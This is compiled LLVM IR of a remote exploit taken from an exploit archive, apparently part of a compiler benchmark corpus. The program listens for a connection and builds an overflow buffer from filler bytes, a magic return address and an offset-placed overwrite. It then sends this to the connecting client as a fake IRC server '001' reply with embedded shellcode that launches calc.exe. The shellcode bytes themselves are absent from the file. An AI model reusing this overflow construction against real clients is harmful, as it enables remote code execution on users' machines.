; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_21274.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_21274.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32 }

@.str = private unnamed_addr constant [20 x i8] c"1: Initialising %u\0A\00", align 1
@.str.1 = private unnamed_addr constant [33 x i8] c"Failed to start winsock exiting\0A\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"Accepted\0A\00", align 1
@OFFSET = common dso_local global i32 0, align 4
@MAGICNUMBER = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [81 x i8] c":testserver 001 %s%scalc.exe :ddd\0A:testserver 001 %s :x\0A:testserver 001 test :x\0A\00", align 1
@shellcode = common dso_local global i8* null, align 8
@.str.4 = private unnamed_addr constant [9 x i8] c"Waiting\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [300 x i8], align 16
  %4 = alloca [190 x i8], align 16
  %5 = alloca [1500 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32*, align 8
  %12 = alloca %struct.sockaddr_in, align 4
  %13 = call i32 @MAKEWORD(i32 1, i32 1)
  store i32 %13, i32* %6, align 4
  %14 = load i32, i32* %6, align 4
  %15 = call i32 @WSAStartup(i32 %14, i32* %7)
  store i32 %15, i32* %9, align 4
  %16 = load i32, i32* %9, align 4
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str, i64 0, i64 0), i32 %16)
  %18 = load i32, i32* %9, align 4
  %19 = icmp ne i32 %18, 0
  br i1 %19, label %20, label %22

20:                                               ; preds = %0
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.1, i64 0, i64 0))
  br label %68

22:                                               ; preds = %0
  %23 = call i32 (...) @openlistensocket()
  store i32 %23, i32* %1, align 4
  store i32 4, i32* %10, align 4
  %24 = load i32, i32* %1, align 4
  %25 = call i32 @accept(i32 %24, %struct.sockaddr_in* %12, i32* %10)
  store i32 %25, i32* %2, align 4
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0))
  %27 = getelementptr inbounds [300 x i8], [300 x i8]* %3, i64 0, i64 0
  %28 = call i32 @memset(i8* %27, i8 signext 88, i32 300)
  %29 = getelementptr inbounds [190 x i8], [190 x i8]* %4, i64 0, i64 0
  %30 = call i32 @memset(i8* %29, i8 signext 89, i32 300)
  %31 = getelementptr inbounds [300 x i8], [300 x i8]* %3, i64 0, i64 204
  store i8 0, i8* %31, align 4
  %32 = load i32, i32* @OFFSET, align 4
  %33 = add nsw i32 %32, 3
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds [190 x i8], [190 x i8]* %4, i64 0, i64 %34
  store i8 0, i8* %35, align 1
  %36 = load i32, i32* @OFFSET, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds [190 x i8], [190 x i8]* %4, i64 0, i64 %37
  store i8 -108, i8* %38, align 1
  %39 = load i32, i32* @OFFSET, align 4
  %40 = add nsw i32 %39, 1
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [190 x i8], [190 x i8]* %4, i64 0, i64 %41
  store i8 116, i8* %42, align 1
  %43 = load i32, i32* @OFFSET, align 4
  %44 = add nsw i32 %43, 2
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [190 x i8], [190 x i8]* %4, i64 0, i64 %45
  store i8 85, i8* %46, align 1
  %47 = getelementptr inbounds [300 x i8], [300 x i8]* %3, i64 0, i64 0
  %48 = getelementptr inbounds i8, i8* %47, i64 200
  %49 = bitcast i8* %48 to i32*
  store i32* %49, i32** %11, align 8
  %50 = load i32, i32* @MAGICNUMBER, align 4
  %51 = load i32*, i32** %11, align 8
  store i32 %50, i32* %51, align 4
  %52 = getelementptr inbounds [1500 x i8], [1500 x i8]* %5, i64 0, i64 0
  %53 = getelementptr inbounds [300 x i8], [300 x i8]* %3, i64 0, i64 0
  %54 = load i8*, i8** @shellcode, align 8
  %55 = getelementptr inbounds [190 x i8], [190 x i8]* %4, i64 0, i64 0
  %56 = call i32 @sprintf(i8* %52, i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.3, i64 0, i64 0), i8* %53, i8* %54, i8* %55)
  %57 = load i32, i32* %2, align 4
  %58 = getelementptr inbounds [1500 x i8], [1500 x i8]* %5, i64 0, i64 0
  %59 = getelementptr inbounds [1500 x i8], [1500 x i8]* %5, i64 0, i64 0
  %60 = call i32 @strlen(i8* %59)
  %61 = call i32 @send(i32 %57, i8* %58, i32 %60, i32 0)
  %62 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0))
  %63 = call i32 @Sleep(i32 10000)
  %64 = load i32, i32* %2, align 4
  %65 = call i32 @closesocket(i32 %64)
  %66 = load i32, i32* %1, align 4
  %67 = call i32 @closesocket(i32 %66)
  br label %68

68:                                               ; preds = %22, %20
  ret void
}

declare dso_local i32 @MAKEWORD(i32, i32) #1

declare dso_local i32 @WSAStartup(i32, i32*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @openlistensocket(...) #1

declare dso_local i32 @accept(i32, %struct.sockaddr_in*, i32*) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*, i8*, i8*) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @Sleep(i32) #1

declare dso_local i32 @closesocket(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
